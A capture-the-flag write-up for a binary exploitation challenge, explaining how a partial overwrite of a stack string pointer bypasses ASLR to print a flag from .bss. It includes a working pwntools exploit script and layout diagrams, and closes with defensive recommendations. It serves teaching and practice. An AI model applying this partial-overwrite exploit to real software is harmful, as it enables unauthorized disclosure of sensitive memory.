# Write-up: Pointer Problems Hard Challenge

## Challenge Overview
**Challenge Name**: Pointer Problems Hard  
**Category**: Binary Exploitation  
**Vulnerability**: Partial Pointer Overwrite + Information Disclosure  
**Protection**: ASLR Enabled  
**Goal**: Read the flag from the .bss section by corrupting a string pointer

## Technical Analysis

### Vulnerability Location
The vulnerability exists in the challenge function where:

1. **Flag is loaded into .bss** but never directly printed
2. **A string pointer** on the stack points to a hardcoded string in .bss
3. **User-controlled buffer overflow** allows partial pointer overwrite
4. **The corrupted pointer gets printed**, revealing whatever it points to

### Memory Layout
```
.bss section:
0x5ab70d49c040: [FLAG DATA]                    ← bssdata (flag location)
...
0x5ab70d49c1a6: "This is a string in the bss!" ← bssdata+358 (hardcoded string)

Stack layout:
[rbp-0x60]: 96-byte stack buffer (user input)
[rbp-0x10]: pointer to bssdata+358 (gets printed)
```

### The Vulnerability
**Root Cause**: The program prints whatever string is pointed to by `[rbp-0x10]`, and this pointer can be partially overwritten via buffer overflow.

**Key Observations**:
- Fixed offset of `358 bytes` (0x166) between flag and hardcoded string in .bss
- Buffer overflow allows overwriting the pointer with controlled data
- ASLR randomizes high bytes but lower 12 bits are page-aligned and predictable

## Exploitation Strategy

### Step 1: Understand the Overflow
- **Buffer**: 96 bytes at `[rbp-0x60]`
- **Target**: Pointer at `[rbp-0x10]` 
- **Offset**: `0x60 - 0x10 = 0x50` (80 bytes)
- **Required payload**: 80 bytes padding + 8 bytes pointer overwrite

### Step 2: Partial Pointer Overwrite
Since ASLR randomizes the high bits but the low 12 bits within a page are constant, we can:

1. **Keep the high bytes** (ASLR base) intact
2. **Overwrite only lower 2 bytes** to change the offset
3. **Change from**: `bssdata+358` (points to hardcoded string)
4. **Change to**: `bssdata` (points to flag)

### Mathematical Foundation
```
Original:  bssdata + 0x166 = points to "This is a string..."
Target:    bssdata + 0x000 = points to flag
Operation: Subtract 0x166 from the pointer
```

In practice, this means changing the lower bytes from `0xc1a6` to `0xc040` (little-endian).

## Exploit Development

### Final Exploit Code
```python
from pwn import *

context.arch = 'amd64'

p = process("/challenge/pointer-problems-hard")

# Send payload size (82 bytes: 80 padding + 2 partial overwrite)
p.recvuntil(b"Payload size:")
p.sendline(b"82")

# Send exploit payload
p.recvuntil(b"Send your payload (up to 82 bytes)!")
payload = b'A' * 80 + b'\x40\xc0'  # Partial overwrite
p.sendline(payload)

# Receive flag
print(p.recvall().decode())
```

### Why This Works
1. **82-byte payload**: 80 bytes padding reaches the pointer + 2 bytes partial overwrite
2. **`b'\x40\xc0'`**: Changes lower 16 bits from `0xc1a6` to `0xc040` (subtract 0x166)
3. **Pointer redirection**: Now points to flag instead of hardcoded string
4. **Program prints flag**: The corrupted pointer causes the flag to be printed

## Technical Details

### ASLR Bypass Technique
The exploit leverages the fact that:
- Memory is allocated in **4KB pages** (0x1000 bytes)
- ASLR randomizes the **page base address** but not **offsets within the page**
- The lower 12 bits of addresses within the same page are predictable

### Stack Layout Analysis
```
+---------------------+
| User Input Buffer   | ← rbp-0x60 (start of our input)
| ...                 |
| ...                 | 
| ...                 |
+---------------------+
| String Pointer      | ← rbp-0x10 (target - offset 80 bytes)
+---------------------+
| Saved RBP           | ← rbp
+---------------------+
| Return Address      | ← rbp+0x8
+---------------------+
```

## Defense Recommendations

### For Developers
1. **Bounds Checking**: Validate all buffer writes
2. **Pointer Integrity**: Use canaries or XOR encryption for sensitive pointers
3. **Address Space Layout Randomization**: Full ASLR makes partial overwrites harder
4. **Control Flow Integrity**: Prevent unexpected code execution

### Compiler Protections
- **Stack Canaries**: Detect buffer overflows
- **PIE**: Make all code and data addresses random
- **FORTIFY_SOURCE**: Catch buffer length issues

## Conclusion

This challenge demonstrates a classic **partial pointer overwrite attack** that bypasses ASLR:

1. **Information Disclosure**: Program reveals memory layout through normal operation
2. **Fixed Offset Discovery**: Identify constant relationship between data objects
3. **Partial Overwrite**: Bypass ASLR by modifying only predictable lower address bits
4. **Control Flow Manipulation**: Redirect program behavior to reveal sensitive data

The exploit succeeds by understanding memory layout patterns and leveraging the deterministic nature of page-aligned memory allocations, showing that even with ASLR enabled, partial address knowledge can be sufficient for successful exploitation.

**Key Takeaway**: Always validate pointer integrity and assume attackers can leverage any memory disclosure to bypass randomization protections.
